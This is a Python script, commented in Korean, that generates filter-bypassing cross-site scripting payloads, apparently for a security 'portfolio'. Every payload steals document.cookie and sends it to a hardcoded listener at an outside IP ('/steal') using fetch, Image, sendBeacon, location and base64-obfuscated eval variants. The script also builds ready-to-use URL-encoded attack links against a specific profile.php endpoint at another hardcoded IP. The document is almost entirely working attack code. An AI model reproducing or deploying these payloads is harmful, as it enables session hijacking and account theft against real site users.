#!/usr/bin/env python3
"""
New XSS Payloads - 시도하지 않은 새로운 페이로드만
포트폴리오 목적: 필터 우회 신규 페이로드

❌ 안 되는 것들 (제외):
- <script> 태그
- <svg> 태그
- <img 뒤 공백
- HTML 엔티티
- alert() 함수
- &lt;...&gt; 이스케이프

✅ 시도할 것들:
- 슬래시 구분자 (<img/...)
- 탭/줄바꿈 구분자
- 다른 HTML 태그들
- 다양한 이벤트 핸들러
- 함수 우회 기법
"""

import base64
import urllib.parse

class NewPayloadGenerator:
    """새로운 필터 우회 페이로드 생성기"""

    def __init__(self, listener_url):
        self.listener_url = listener_url

    def slash_variants(self):
        """슬래시 구분자 변형들"""
        return [
            # 기본 슬래시
            f'<img/src=x/onerror=fetch("{self.listener_url}?c="+document.cookie)>',
            f'<img/src=x/onerror=fetch("{self.listener_url}?c="+document.cookie)/>',
            f'<img/src/onerror=fetch("{self.listener_url}?c="+document.cookie)>',

            # new Image() 사용
            f'<img/src=x/onerror=new(Image).src="{self.listener_url}?c="+document.cookie>',

            # location 사용
            f'<img/src=x/onerror=location="{self.listener_url}?c="+document.cookie>',
            f'<img/src=x/onerror=location.href="{self.listener_url}?c="+document.cookie>',

            # document.write
            f'<img/src=x/onerror=document.write("<img src={self.listener_url}?c="+document.cookie+">")>',
        ]

    def tab_newline_variants(self):
        """탭/줄바꿈 구분자 변형들"""
        return [
            # 탭 문자
            f'<img\tsrc=x\tonerror=fetch("{self.listener_url}?c="+document.cookie)>',
            f'<img\tsrc=x\tonerror=new(Image).src="{self.listener_url}?c="+document.cookie>',

            # 줄바꿈
            f'<img\nsrc=x\nonerror=fetch("{self.listener_url}?c="+document.cookie)>',
            f'<img\nsrc=x\nonerror=new(Image).src="{self.listener_url}?c="+document.cookie>',

            # 탭 + 줄바꿈 혼합
            f'<img\t\nsrc=x\t\nonerror=fetch("{self.listener_url}?c="+document.cookie)>',
        ]

    def alternative_tags(self):
        """img, svg 외 다른 태그들"""
        return [
            # details 태그
            f'<details/open/ontoggle=fetch("{self.listener_url}?c="+document.cookie)>',
            f'<details\topen\tontoggle=fetch("{self.listener_url}?c="+document.cookie)>',

            # input 태그
            f'<input/onfocus=fetch("{self.listener_url}?c="+document.cookie)/autofocus>',
            f'<input\tonfocus=fetch("{self.listener_url}?c="+document.cookie)\tautofocus>',

            # body 태그
            f'<body/onload=fetch("{self.listener_url}?c="+document.cookie)>',
            f'<body\tonload=fetch("{self.listener_url}?c="+document.cookie)>',

            # iframe 태그
            f'<iframe/src="javascript:fetch(\'{self.listener_url}?c=\'+document.cookie)">',
            f'<iframe/src="javascript:location=\'{self.listener_url}?c=\'+document.cookie">',

            # video/audio 태그
            f'<video/src/onerror=fetch("{self.listener_url}?c="+document.cookie)>',
            f'<audio/src/onerror=fetch("{self.listener_url}?c="+document.cookie)>',

            # object/embed 태그
            f'<object/data="javascript:fetch(\'{self.listener_url}?c=\'+document.cookie)">',
            f'<embed/src="javascript:fetch(\'{self.listener_url}?c=\'+document.cookie)">',

            # marquee 태그
            f'<marquee/onstart=fetch("{self.listener_url}?c="+document.cookie)>',

            # form 태그
            f'<form/action="{self.listener_url}?c="+document.cookie/method=get>',
        ]

    def event_handler_variants(self):
        """다양한 이벤트 핸들러"""
        events = [
            'onerror', 'onload', 'onfocus', 'onmouseover', 'onmouseout',
            'onclick', 'ondblclick', 'onmouseenter', 'onmouseleave',
            'onchange', 'oninput', 'onsubmit', 'onreset',
            'ontoggle', 'onstart', 'onpageshow'
        ]

        payloads = []
        for event in events:
            payloads.append(
                f'<img/src=x/{event}=fetch("{self.listener_url}?c="+document.cookie)>'
            )
        return payloads

    def base64_obfuscation(self):
        """Base64 난독화 변형"""
        # fetch 코드를 Base64로
        fetch_code = f'fetch("{self.listener_url}?c="+document.cookie)'
        b64 = base64.b64encode(fetch_code.encode()).decode()

        return [
            # eval + atob
            f'<img/src=x/onerror=eval(atob("{b64}"))>',
            f'<input/onfocus=eval(atob("{b64}"))/autofocus>',
            f'<details/open/ontoggle=eval(atob("{b64}"))>',

            # Function 생성자
            f'<img/src=x/onerror=Function(atob("{b64}"))()>',
        ]

    def function_alternatives(self):
        """fetch 대체 함수들"""
        return [
            # XMLHttpRequest
            f'<img/src=x/onerror=new(XMLHttpRequest).open("GET","{self.listener_url}?c="+document.cookie)>',

            # navigator.sendBeacon
            f'<img/src=x/onerror=navigator.sendBeacon("{self.listener_url}?c="+document.cookie)>',

            # document.createElement
            f'<img/src=x/onerror=document.createElement("img").src="{self.listener_url}?c="+document.cookie>',

            # setTimeout
            f'<img/src=x/onerror=setTimeout("fetch(\'{self.listener_url}?c=\'+document.cookie)",0)>',

            # setInterval
            f'<img/src=x/onerror=setInterval("fetch(\'{self.listener_url}?c=\'+document.cookie)",9999)>',

            # requestAnimationFrame
            f'<img/src=x/onerror=requestAnimationFrame(()=>fetch("{self.listener_url}?c="+document.cookie))>',
        ]

    def character_encoding(self):
        """문자 인코딩 변형"""
        return [
            # 일부 문자만 인코딩
            f'<img/src=x/on&#101;rror=fetch("{self.listener_url}?c="+document.cookie)>',
            f'<img/src=x/onerror=&#102;etch("{self.listener_url}?c="+document.cookie)>',

            # 16진수 인코딩
            f'<img/src=x/onerror=\\x66\\x65\\x74\\x63\\x68("{self.listener_url}?c="+document.cookie)>',

            # 유니코드 이스케이프
            f'<img/src=x/onerror=\\u0066\\u0065\\u0074\\u0063\\u0068("{self.listener_url}?c="+document.cookie)>',
        ]

    def attribute_variations(self):
        """속성 변형"""
        return [
            # src 없이
            f'<img/onerror=fetch("{self.listener_url}?c="+document.cookie)>',

            # 속성 순서 변경
            f'<img/onerror=fetch("{self.listener_url}?c="+document.cookie)/src=x>',

            # 중복 속성
            f'<img/src=x/src=y/onerror=fetch("{self.listener_url}?c="+document.cookie)>',

            # 빈 속성
            f'<img/src/x/onerror=fetch("{self.listener_url}?c="+document.cookie)>',
        ]

    def nested_tags(self):
        """중첩 태그"""
        return [
            f'<details><img/src=x/onerror=fetch("{self.listener_url}?c="+document.cookie)></details>',
            f'<form><input/onfocus=fetch("{self.listener_url}?c="+document.cookie)/autofocus></form>',
        ]

    def generate_all_new(self):
        """모든 새로운 페이로드 생성"""
        all_payloads = {}

        all_payloads['slash_variants'] = self.slash_variants()
        all_payloads['tab_newline_variants'] = self.tab_newline_variants()
        all_payloads['alternative_tags'] = self.alternative_tags()
        all_payloads['event_handler_variants'] = self.event_handler_variants()
        all_payloads['base64_obfuscation'] = self.base64_obfuscation()
        all_payloads['function_alternatives'] = self.function_alternatives()
        all_payloads['character_encoding'] = self.character_encoding()
        all_payloads['attribute_variations'] = self.attribute_variations()
        all_payloads['nested_tags'] = self.nested_tags()

        return all_payloads

    def profile_php_payloads(self):
        """profile.php 전용 최적 페이로드"""
        # Base64 인코딩 준비
        fetch_code = f'fetch("{self.listener_url}?c="+document.cookie)'
        b64_code = base64.b64encode(fetch_code.encode()).decode()

        priority_payloads = [
            # Top 1: 슬래시 구분자 + fetch
            f'<img/src=x/onerror=fetch("{self.listener_url}?c="+document.cookie)>',

            # Top 2: 슬래시 구분자 + new Image
            f'<img/src=x/onerror=new(Image).src="{self.listener_url}?c="+document.cookie>',

            # Top 3: details 태그
            f'<details/open/ontoggle=fetch("{self.listener_url}?c="+document.cookie)>',

            # Top 4: input autofocus
            f'<input/onfocus=fetch("{self.listener_url}?c="+document.cookie)/autofocus>',

            # Top 5: iframe javascript:
            f'<iframe/src="javascript:fetch(\'{self.listener_url}?c=\'+document.cookie)">',

            # Top 6: Base64 난독화
            f'<img/src=x/onerror=eval(atob("{b64_code}"))>',

            # Top 7: 탭 구분자
            f'<img\tsrc=x\tonerror=fetch("{self.listener_url}?c="+document.cookie)>',

            # Top 8: video 태그
            f'<video/src/onerror=fetch("{self.listener_url}?c="+document.cookie)>',

            # Top 9: marquee 태그
            f'<marquee/onstart=fetch("{self.listener_url}?c="+document.cookie)>',

            # Top 10: body onload
            f'<body/onload=fetch("{self.listener_url}?c="+document.cookie)>',
        ]

        # URL 인코딩
        encoded_payloads = []
        for payload in priority_payloads:
            encoded = urllib.parse.quote(payload)
            encoded_payloads.append({
                'original': payload,
                'url_encoded': encoded,
                'full_url': f'http://3.34.90.201/profile.php?email=test@test&full_name={encoded}'
            })

        return encoded_payloads

if __name__ == '__main__':
    listener = "http://3.113.201.239:8888/steal"
    gen = NewPayloadGenerator(listener)

    print("\n" + "="*80)
    print("🎯 NEW XSS Payloads - 시도하지 않은 페이로드만")
    print("="*80 + "\n")

    print("❌ 제외된 페이로드:")
    print("  - <script> 태그")
    print("  - <svg> 태그")
    print("  - <img 공백 ...> 형태")
    print("  - HTML 엔티티 (<&#...>)")
    print("  - alert() 함수\n")

    print("="*80)
    print("🔥 Profile.php 최적 페이로드 Top 10")
    print("="*80 + "\n")

    profile_payloads = gen.profile_php_payloads()
    for idx, p in enumerate(profile_payloads, 1):
        print(f"[{idx}] {p['original'][:80]}...")
        print(f"    URL: {p['full_url'][:100]}...\n")

    print("="*80)
    print("🎯 카테고리별 새로운 페이로드")
    print("="*80 + "\n")

    all_payloads = gen.generate_all_new()
    for category, payloads in all_payloads.items():
        print(f"\n[{category}] ({len(payloads)} payloads)")
        for payload in payloads[:3]:  # 각 카테고리에서 3개만 미리보기
            print(f"  {payload[:80]}...")
